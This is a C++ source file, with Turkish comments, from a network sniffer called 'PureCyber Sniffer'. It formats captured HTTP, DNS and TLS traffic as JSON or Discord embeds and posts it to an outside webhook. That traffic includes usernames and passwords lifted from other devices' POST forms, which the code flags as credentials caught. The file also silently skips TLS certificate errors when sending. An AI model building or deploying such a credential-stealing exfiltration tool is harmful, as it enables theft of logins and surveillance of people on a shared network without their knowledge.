#include "webhook.hpp"
#include "display.hpp"
#include "../config.hpp"

#include <windows.h>
#include <wininet.h>
#include <sstream>
#include <string>
#include <chrono>
#include <ctime>
#include <iomanip>
#include <mutex>
#include <atomic>

#pragma comment(lib, "wininet.lib")

// ============================================================
//  webhook.cpp — WinINet tabanlı HTTP POST gönderici
// ============================================================

namespace Webhook {

    static HINTERNET g_hInternet = nullptr;
    static std::mutex g_send_mutex;

    // Son gönderim zamanı (throttle için)
    static std::atomic<time_t> g_last_send{ 0 };

    // ─── Init / Cleanup ───────────────────────────────────────────────────────
    void Init() {
        g_hInternet = InternetOpenA(
            "PureCyber-Sniffer/1.0",
            INTERNET_OPEN_TYPE_PRECONFIG,
            nullptr, nullptr, 0
        );
    }

    void Cleanup() {
        if (g_hInternet) {
            InternetCloseHandle(g_hInternet);
            g_hInternet = nullptr;
        }
    }

    bool IsEnabled() {
        return !Config::WEBHOOK_URL.empty();
    }

    // ─── JSON Escape ──────────────────────────────────────────────────────────
    std::string JsonEscape(const std::string& s) {
        std::string result;
        result.reserve(s.size() + 8);
        for (unsigned char c : s) {
            switch (c) {
                case '"':  result += "\\\""; break;
                case '\\': result += "\\\\"; break;
                case '\b': result += "\\b";  break;
                case '\f': result += "\\f";  break;
                case '\n': result += "\\n";  break;
                case '\r': result += "\\r";  break;
                case '\t': result += "\\t";  break;
                default:
                    if (c < 0x20) {
                        // Control char → \uXXXX
                        char buf[8];
                        snprintf(buf, sizeof(buf), "\\u%04x", c);
                        result += buf;
                    } else {
                        result += c;
                    }
                    break;
            }
        }
        return result;
    }

    // ─── Zaman damgası ────────────────────────────────────────────────────────
    static std::string NowISO() {
        auto now = std::chrono::system_clock::now();
        std::time_t t = std::chrono::system_clock::to_time_t(now);
        struct tm tmInfo;
        gmtime_s(&tmInfo, &t);
        std::ostringstream ss;
        ss << std::put_time(&tmInfo, "%Y-%m-%dT%H:%M:%SZ");
        return ss.str();
    }

    // ─── URL Parse ve POST ────────────────────────────────────────────────────
    bool PostJSON(const std::string& json_body) {
        if (!IsEnabled()) return false;
        if (!g_hInternet) return false;

        // Throttle kontrolü
        time_t now = time(nullptr);
        time_t last = g_last_send.load();
        if (now - last < Config::WEBHOOK_COOLDOWN_SEC) return false;

        std::lock_guard<std::mutex> lock(g_send_mutex);

        // URL'i parse et
        const std::string& url = Config::WEBHOOK_URL;
        URL_COMPONENTSA uc = {};
        uc.dwStructSize = sizeof(uc);

        char scheme[16]   = {};
        char host[256]    = {};
        char path[1024]   = {};
        char extra[256]   = {};

        uc.lpszScheme      = scheme;  uc.dwSchemeLength  = sizeof(scheme) - 1;
        uc.lpszHostName    = host;    uc.dwHostNameLength = sizeof(host) - 1;
        uc.lpszUrlPath     = path;    uc.dwUrlPathLength  = sizeof(path) - 1;
        uc.lpszExtraInfo   = extra;   uc.dwExtraInfoLength = sizeof(extra) - 1;

        if (!InternetCrackUrlA(url.c_str(), (DWORD)url.size(), 0, &uc)) {
            return false;
        }

        bool is_https = (std::string(scheme) == "https");
        DWORD flags = is_https ? INTERNET_FLAG_SECURE : 0;
        flags |= INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;

        HINTERNET hConnect = InternetConnectA(
            g_hInternet,
            host,
            uc.nPort ? uc.nPort : (is_https ? 443 : 80),
            nullptr, nullptr,
            INTERNET_SERVICE_HTTP,
            0, 0
        );
        if (!hConnect) return false;

        std::string full_path = std::string(path) + std::string(extra);

        HINTERNET hRequest = HttpOpenRequestA(
            hConnect,
            "POST",
            full_path.c_str(),
            "HTTP/1.1",
            nullptr, nullptr,
            flags, 0
        );
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            return false;
        }

        const char* headers = "Content-Type: application/json\r\n";
        bool ok = HttpSendRequestA(
            hRequest,
            headers,
            (DWORD)strlen(headers),
            (LPVOID)json_body.c_str(),
            (DWORD)json_body.size()
        ) == TRUE;

        // SSL sertifika hatalarını atla (self-signed vb.)
        if (!ok) {
            DWORD err = GetLastError();
            if (err == ERROR_INTERNET_INVALID_CA ||
                err == ERROR_INTERNET_SEC_CERT_CN_INVALID ||
                err == ERROR_INTERNET_SEC_CERT_DATE_INVALID)
            {
                DWORD dwFlags;
                DWORD dwSize = sizeof(dwFlags);
                InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwSize);
                dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
                InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
                ok = HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers),
                                       (LPVOID)json_body.c_str(), (DWORD)json_body.size()) == TRUE;
            }
        }

        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);

        if (ok) {
            g_last_send.store(now);
        }

        return ok;
    }

    // ─── HTTP Paketi → JSON → Webhook ────────────────────────────────────────
    bool SendHTTP(const Parser::HTTPPacket& pkt) {
        if (!IsEnabled()) return false;

        // Tam URL oluştur: http://host/path
        std::string full_url = "http://";
        if (!pkt.host.empty()) full_url += pkt.host;
        if (!pkt.path.empty()) full_url += pkt.path;

        std::ostringstream json;
        json << "{"
             << "\"type\":\"HTTP\","
             << "\"timestamp\":\"" << JsonEscape(NowISO()) << "\","
             << "\"full_url\":\""  << JsonEscape(full_url)  << "\","
             << "\"src_ip\":\""    << JsonEscape(pkt.src_ip)  << "\","
             << "\"dst_ip\":\""    << JsonEscape(pkt.dst_ip)  << "\","
             << "\"src_mac\":\""   << JsonEscape(pkt.src_mac) << "\","
             << "\"vendor\":\""    << JsonEscape(pkt.vendor)  << "\","
             << "\"method\":\""    << JsonEscape(pkt.method)  << "\","
             << "\"host\":\""      << JsonEscape(pkt.host)    << "\","
             << "\"path\":\""      << JsonEscape(pkt.path)    << "\","
             << "\"os\":\""        << JsonEscape(pkt.os_guess) << "\","
             << "\"browser\":\""   << JsonEscape(pkt.browser) << "\","
             << "\"user_agent\":\"" << JsonEscape(pkt.user_agent) << "\","
             << "\"content_type\":\"" << JsonEscape(pkt.content_type) << "\","
             << "\"referer\":\""   << JsonEscape(pkt.referer) << "\","
             << "\"src_port\":"    << pkt.src_port << ","
             << "\"dst_port\":"    << pkt.dst_port
             << "}";

        // Discord embed formatı
        if (Config::WEBHOOK_URL.find("discord.com") != std::string::npos) {
            // Tam URL kısa versiyonu (embed description'a sığsın)
            std::string url_display = full_url;
            if (url_display.size() > 200) url_display = url_display.substr(0, 200) + "...";

            std::string device_info = JsonEscape(pkt.src_ip) + ":" + std::to_string(pkt.src_port);
            if (!pkt.vendor.empty())   device_info += " [" + JsonEscape(pkt.vendor) + "]";
            else if (!pkt.src_mac.empty()) device_info += " (" + JsonEscape(pkt.src_mac) + ")";

            std::string os_info = pkt.os_guess.empty() ? "?" : JsonEscape(pkt.os_guess);
            if (!pkt.browser.empty()) os_info += " / " + JsonEscape(pkt.browser);

            std::ostringstream embed;
            embed << "{"
                  << "\"embeds\":[{"
                  << "\"title\":\"🌐 HTTP " << JsonEscape(pkt.method) << " Yakalandı\","
                  << "\"color\":3447003,"
                  // description'a tam tıklanabilir link
                  << "\"description\":\"[" << JsonEscape(url_display) << "](" << JsonEscape(full_url) << ")\","
                  << "\"fields\":["
                  << "{\"name\":\"📡 Cihaz\",\"value\":\""   << device_info  << "\",\"inline\":true},"
                  << "{\"name\":\"💻 OS / Tarayıcı\",\"value\":\"" << os_info << "\",\"inline\":true}";

            // Referer varsa ekle
            if (!pkt.referer.empty()) {
                embed << ",{\"name\":\"🔗 Referer\",\"value\":\""
                      << JsonEscape(pkt.referer.substr(0, 100)) << "\",\"inline\":false}";
            }

            // User-Agent varsa ekle (kısa)
            if (!pkt.user_agent.empty()) {
                std::string ua_short = pkt.user_agent.substr(0, 80);
                embed << ",{\"name\":\"🕵️ User-Agent\",\"value\":\""
                      << JsonEscape(ua_short) << (pkt.user_agent.size() > 80 ? "..." : "") << "\",\"inline\":false}";
            }

            embed << "],"
                  << "\"footer\":{\"text\":\"PureCyber Sniffer • " << JsonEscape(NowISO()) << "\"}"
                  << "}]"
                  << "}";
            return PostJSON(embed.str());
        }

        return PostJSON(json.str());
    }

    // ─── DNS Paketi → JSON → Webhook ─────────────────────────────────────────
    bool SendDNS(const Parser::DNSPacket& pkt) {
        if (!IsEnabled()) return false;

        // Domain listesini JSON array'e çevir
        std::ostringstream domains;
        domains << "[";
        for (size_t i = 0; i < pkt.queries.size(); ++i) {
            if (i) domains << ",";
            domains << "\"" << JsonEscape(pkt.queries[i]) << "\"";
        }
        domains << "]";

        if (Config::WEBHOOK_URL.find("discord.com") != std::string::npos) {
            // Discord embed formatı
            std::string domain_list;
            for (const auto& d : pkt.queries) domain_list += d + "\n";

            std::ostringstream embed;
            embed << "{"
                  << "\"embeds\":[{"
                  << "\"title\":\"🔍 DNS Sorgusu\","
                  << "\"color\":10181046,"
                  << "\"fields\":["
                  << "{\"name\":\"Kaynak\",\"value\":\"" << JsonEscape(pkt.src_ip)
                                                          << " (" << JsonEscape(pkt.vendor.empty() ? pkt.src_mac : pkt.vendor)
                                                          << ")\",\"inline\":true},"
                  << "{\"name\":\"Sorgulanan Domain\",\"value\":\"" << JsonEscape(domain_list.substr(0, 200))
                                                                      << "\",\"inline\":false}"
                  << "],"
                  << "\"footer\":{\"text\":\"PureCyber Sniffer • " << JsonEscape(NowISO()) << "\"}"
                  << "}]"
                  << "}";
            return PostJSON(embed.str());
        }

        std::ostringstream json;
        json << "{"
             << "\"type\":\"DNS\","
             << "\"timestamp\":\"" << JsonEscape(NowISO()) << "\","
             << "\"src_ip\":\""    << JsonEscape(pkt.src_ip)  << "\","
             << "\"src_mac\":\""   << JsonEscape(pkt.src_mac) << "\","
             << "\"vendor\":\""    << JsonEscape(pkt.vendor)  << "\","
              << "\"queries\":"     << domains.str()
             << "}";

        return PostJSON(json.str());
    }

    // ─── TLS/SNI Paketi → Webhook ─────────────────────────────────────────────
    bool SendTLS(const TLSSniffer::TLSPacket& pkt) {
        if (!IsEnabled()) return false;

        if (Config::WEBHOOK_URL.find("discord.com") != std::string::npos) {
            std::string device_info = JsonEscape(pkt.src_ip) + ":" + std::to_string(pkt.src_port);
            if (!pkt.vendor.empty())    device_info += " [" + JsonEscape(pkt.vendor) + "]";
            else if (!pkt.src_mac.empty()) device_info += " (" + JsonEscape(pkt.src_mac) + ")";

            std::ostringstream embed;
            embed << "{"
                  << "\"embeds\":[{"
                  << "\"title\":\"🔐 HTTPS Bağlantısı\","
                  << "\"color\":5763719,"  // yeşil
                  << "\"description\":\"[https://" << JsonEscape(pkt.sni) << "](https://" << JsonEscape(pkt.sni) << ")\","
                  << "\"fields\":["
                  << "{\"name\":\"📡 Cihaz\",\"value\":\"" << device_info << "\",\"inline\":true},"
                  << "{\"name\":\"🔒 Protokol\",\"value\":\"" << JsonEscape(pkt.tls_version) << "\",\"inline\":true}"
                  << "],"
                  << "\"footer\":{\"text\":\"PureCyber Sniffer • " << JsonEscape(NowISO()) << "\"}"
                  << "}]"
                  << "}";
            return PostJSON(embed.str());
        }

        std::ostringstream json;
        json << "{"
             << "\"type\":\"TLS\","
             << "\"timestamp\":\"" << JsonEscape(NowISO()) << "\","
             << "\"sni\":\""       << JsonEscape(pkt.sni)         << "\","
             << "\"full_url\":\"https://" << JsonEscape(pkt.sni)  << "\","
             << "\"tls_version\":\"" << JsonEscape(pkt.tls_version) << "\","
             << "\"src_ip\":\""    << JsonEscape(pkt.src_ip)  << "\","
             << "\"dst_ip\":\""    << JsonEscape(pkt.dst_ip)  << "\","
             << "\"src_mac\":\""   << JsonEscape(pkt.src_mac) << "\","
             << "\"vendor\":\""    << JsonEscape(pkt.vendor)  << "\","
             << "\"src_port\":"    << pkt.src_port << ","
             << "\"dst_port\":"    << pkt.dst_port
             << "}";
        return PostJSON(json.str());
    }

    // ─── Credential → Webhook ─────────────────────────────────────────────────
    bool SendCredential(const Credential::CredEntry& cred) {
        if (!IsEnabled()) return false;

        if (Config::WEBHOOK_URL.find("discord.com") != std::string::npos) {
            std::string device_info = JsonEscape(cred.src_ip);
            if (!cred.vendor.empty())    device_info += " [" + JsonEscape(cred.vendor) + "]";
            else if (!cred.src_mac.empty()) device_info += " (" + JsonEscape(cred.src_mac) + ")";

            // Field'ları formatla
            std::string fields_str;
            for (const auto& [k, v] : cred.fields) {
                fields_str += "`" + k + "` = `" + (v.size() > 60 ? v.substr(0, 60) + "..." : v) + "`\n";
                if (fields_str.size() > 900) { fields_str += "...(daha fazla)"; break; }
            }

            int color = cred.has_sensitive ? 15548997 : 16776960; // kırmızı veya sarı

            std::ostringstream embed;
            embed << "{"
                  << "\"embeds\":[{"
                  << "\"title\":\"" << (cred.has_sensitive ? "🔑 KREDENSİYEL YAKALANDI!" : "📋 POST Form Verisi") << "\","
                  << "\"color\":" << color << ","
                  << "\"description\":\"" << JsonEscape(fields_str) << "\","
                  << "\"fields\":["
                  << "{\"name\":\"📡 Cihaz\",\"value\":\"" << device_info << "\",\"inline\":true},"
                  << "{\"name\":\"🌐 Hedef\",\"value\":\"http://" << JsonEscape(cred.host) << JsonEscape(cred.path) << "\",\"inline\":true}"
                  << "],"
                  << "\"footer\":{\"text\":\"PureCyber Sniffer • " << JsonEscape(NowISO()) << "\"}"
                  << "}]"
                  << "}";
            return PostJSON(embed.str());
        }

        // JSON fields array
        std::ostringstream fields_json;
        fields_json << "[";
        bool first_f = true;
        for (const auto& [k, v] : cred.fields) {
            if (!first_f) fields_json << ",";
            first_f = false;
            fields_json << "{\"key\":\"" << JsonEscape(k) << "\","
                        << "\"value\":\"" << JsonEscape(v) << "\","
                        << "\"sensitive\":" << (Credential::IsSensitiveField(k) ? "true" : "false")
                        << "}";
        }
        fields_json << "]";

        std::ostringstream json;
        json << "{"
             << "\"type\":\"CREDENTIAL\","
             << "\"timestamp\":\"" << JsonEscape(NowISO()) << "\","
             << "\"has_sensitive\":" << (cred.has_sensitive ? "true" : "false") << ","
             << "\"src_ip\":\""   << JsonEscape(cred.src_ip)  << "\","
             << "\"src_mac\":\""  << JsonEscape(cred.src_mac) << "\","
             << "\"vendor\":\""   << JsonEscape(cred.vendor)  << "\","
             << "\"host\":\""     << JsonEscape(cred.host)    << "\","
             << "\"path\":\""     << JsonEscape(cred.path)    << "\","
             << "\"full_url\":\"http://" << JsonEscape(cred.host) << JsonEscape(cred.path) << "\","
             << "\"fields\":"     << fields_json.str()
             << "}";
        return PostJSON(json.str());
    }
}
